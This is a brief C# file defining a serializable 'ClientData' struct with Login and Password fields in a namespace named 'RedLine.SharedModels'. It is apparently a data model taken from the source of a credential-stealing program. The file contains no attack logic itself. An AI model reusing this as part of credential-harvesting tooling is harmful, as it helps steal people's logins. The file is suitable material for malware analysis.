using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "ClientData")]
[DataContract(Name = "ClientData", Namespace = "v1/Models")]
public struct ClientData
{
	[ProtoMember(2, Name = "Login")]
	[DataMember(Name = "Login")]
	public string Login { get; set; }

	[ProtoMember(3, Name = "Password")]
	[DataMember(Name = "Password")]
	public string Password { get; set; }
}
